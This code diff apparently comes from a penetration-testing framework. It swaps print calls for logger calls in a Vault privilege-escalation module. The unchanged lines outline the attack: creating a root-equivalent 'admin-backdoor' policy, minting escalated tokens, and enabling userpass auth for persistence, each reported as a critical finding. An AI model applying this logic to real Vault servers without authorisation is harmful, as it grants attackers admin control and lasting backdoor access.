@@ -17,6 +17,7 @@ from __future__ import annotations
 from typing import Optional
 
 from core.tls_config import vault_request
+from core.logger import logger
 
 from ...context import ExecutionContext
 from ...registry import BaseExecutionModule, ExecutionResult, RiskLevel
@@ -151,7 +152,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
         evidence["backdoor_policy"] = backdoor_policy
 
         if policy_created:
-            print(f"[*] [ACTIVE] Created root-equivalent policy: {backdoor_policy}")
+            logger.info(f"[ACTIVE] Created root-equivalent policy: {backdoor_policy}")
             context.add_finding(
                 title="CRITICAL: Root-Equivalent Policy Created",
                 description=(
@@ -162,7 +163,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
                 evidence={"policy_name": backdoor_policy, "policy_body": FULL_ACCESS_POLICY},
             )
         else:
-            print("[!] [ACTIVE] Failed to create admin-backdoor policy")
+            logger.error("[ACTIVE] Failed to create admin-backdoor policy")
 
         # Step 3: Create token with admin-backdoor policy
         token_created = False
@@ -180,7 +181,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
                 evidence["escalated_token"] = escalated_token
                 setattr(context, "captured_token", escalated_token)
                 setattr(context, "escalated_token", escalated_token)
-                print(f"[*] [ACTIVE] Root-equivalent token created: {escalated_token[:24]}...")
+                logger.info(f"[ACTIVE] Root-equivalent token created: {escalated_token[:24]}...")
                 context.add_finding(
                     title="CRITICAL: Root-Equivalent Token Created via Backdoor Policy",
                     description=(
@@ -205,7 +206,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
             evidence["persistence_deployed"] = persistence_deployed
 
             if persistence_deployed:
-                print("[*] [ACTIVE] Userpass auth method enabled for persistence")
+                logger.info("[ACTIVE] Userpass auth method enabled for persistence")
                 context.add_finding(
                     title="CRITICAL: Persistent Access Deployed via Userpass Auth",
                     description=(
@@ -247,7 +248,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
 
         for policy_name in target_policies:
             if policy_name in source_policies:
-                print(f"[*] [ACTIVE] Skipping already-held policy: {policy_name}")
+                logger.info(f"[ACTIVE] Skipping already-held policy: {policy_name}")
                 attempts.append({
                     "policy": policy_name,
                     "status_code": "skipped",
@@ -256,7 +257,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
                 continue
 
             payload = {"policies": [policy_name], "ttl": ttl}
-            print(f"[*] [ACTIVE] Attempting policy: {policy_name}")
+            logger.info(f"[ACTIVE] Attempting policy: {policy_name}")
             response = vault_request(
                 "POST", create_url, headers=headers, json=payload,
                 timeout=timeout, verify=verify_tls,
@@ -283,7 +284,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
             if new_token and not _token_has_elevated_access(
                 vault_addr, new_token, timeout, verify_tls
             ):
-                print(f"[!] [ACTIVE] Token with '{policy_name}' created but NOT elevated — skipping")
+                logger.warning(f"[ACTIVE] Token with '{policy_name}' created but NOT elevated — skipping")
                 attempt["reason"] = "policy does not grant elevated access (non-existent or weak policy)"
                 continue
 
